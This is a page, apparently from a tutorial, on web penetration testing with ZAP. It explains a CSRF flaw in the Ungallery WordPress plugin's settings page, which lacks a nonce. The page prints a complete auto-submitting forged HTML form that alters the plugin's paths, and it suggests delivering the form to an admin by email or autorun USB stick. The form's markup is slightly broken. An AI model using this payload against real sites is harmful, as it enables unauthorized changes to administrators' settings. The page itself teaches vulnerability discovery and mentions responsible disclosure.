- pgno: 68
  md: 'attacks in the WordPress blog, carefully crafted malicious data can sometimes
    be snuck in if the site doesn’t properly validate these inputs.


    Once we’ve built up a complete picture of our victim, we can start looking where
    to attack. On even a simple WordPress site like ours, there are hundreds of vectors
    we could look at, but most won’t be vulnerable. Part of the art of breaking in
    to websites is knowing which vectors to focus on. For example, we could try to
    attack the page_id parameter that’s on most of the pages, but that’s so central
    to WordPress that it’s been under a lot of scrutiny. It could be vulnerable, but
    it’s likely to be a difficult way in. We’re better off looking for weaknesses
    in the lesser-used areas. Add-ons have, historically, been a far more fruitful
    place for attackers than the main application


    # Cross Site Request Forgery


    We noticed that, under the Alerts tab, ZAP had listed a number of pages as vulnerable
    to Cross Site Request Forgery (CSRF). This is a style of attack where you trick
    a web app into accepting input by creating another website that mimics the HTTP
    request of the web app. If you can then get an authenticated user to open your
    malicious website, their browser will send their authentication cookie, which
    allows your malicious HTTP request to be performed by their user (don’t worry
    if you don’t fully understand this, it should become clearer as we go through
    the attack).


    WordPress usually stops this style of attack by using a nonce. This is a random
    number that’s passed to the browser when the form is created. If the same number
    is passed back to the server with the form data, then the server knows that the
    form was submitted by a user at the site. If it isn’t, then the server knows that
    the form was submitted by some other site, and just drops the data. However, we
    noticed that one of the pages didn’t have a nonce. It appeared to be a straight
    HTTP POST request validated using the cookie. This meant that any HTML form (regardless
    of what site it was on) could submit data to this part of the application. This
    looked like the perfect target for a CSRF attack. The page in question was the
    settings for Ungallery (see screenshot, bottom-left, for the request).


    The trick now was to create a new page that generated an identical HTTP request.
    It was a POST request, and this is easiest to forge using an HTML form. We created
    a new file containing the following:


    ```

    <html>

    <head>

    <title>Test site for csrf in Ungallery</title>

    </head>

    <body>

    <form action="http://site/wp-admin/options-general.php?page=ungallery-settings"
    method="POST">

    <input type="hidden" name="_nt_submit_hidden" value="Y">

    <input type="hidden" name="images_path" value="%2Froot%2Fvar%2Fwww%2Fimages%2F">

    <input type="hidden" name="URI" value="http%3A%2F%2F192.168.133.143%2F">

    <input type="hidden" name="gallery" value="%3Fpage_id%3D9">

    <input type="hidden" name="cache_dir" value="%2Fvar%2Fwww%2Fwordpress%2Fwp-content%2Fcache%2F">

    <input type="hidden" name="columns" value="5">

    ```


    ![](img/b6e789f7b1bc6629f6c97a3e4beae1de_68_0.png)


    The Quick Start tab is new in ZAP 2. Just enter the URL you want to attack and
    it will spider the website and search for vulnerabilities. It’s a good starting
    point, but it won’t find everything.


    ```

    <input type="hidden" name="thumbnail" value="190">

    <input type="hidden" name="browse_view" value="440">

    <input type="hidden" name="hidden" value="hidden">

    <input type="hidden" name="gallery2" value="">

    <input type="hidden" name="images2_path" value="">

    <input type="hidden" name="gallery3" value="">

    <input type="hidden" name="images3_path" value="">

    <input type="hidden" name="gallery4" value="">

    <input type="hidden" name="images4_path" value="">

    <input type="hidden" name="gallery5" value="">

    <input type="hidden" name="images5_path" value="">

    <input type="hidden" name="gallery6" value="">

    <input type="hidden" name="images6_path" value="">

    <input type="hidden" name="Submit" value="">

    value="Save Changes">

    <form>

    <script>document.forms[0].submit();</script>

    </head>

    ```


    As you can see, this is a new HTML form that submits data to the Ungallery settings
    page. Since there’s no nonce, Ungallery automatically accepts it if it has the
    right cookie. If someone with administrator privileges opens the file, it alters
    the settings. In a real attack, this could be done by emailing a tempting link
    to an admin, or perhaps leaving a USB stick with an autorun script lying around
    in public. Of course, this isn’t the most damaging attack, but it could be used
    to reveal images that were meant to be kept secret.


    The story, of course, doesn’t end there. We practise responsible disclosure. This
    means that while we are happy to publish details of the vulnerability, we made
    sure that we told the developer first.


    As you saw, finding vulnerabilities is a combination of knowing what to look for,
    and searching the application for them. It can be long, slow process. There are
    some automatic scanners (such as the one included in ZAP), but at first it’s a
    good idea to do it manually, so you know what’s going on. Many penetration testers
    prefer to do things manually because they can be far more thorough than automatic
    scanners can be.'
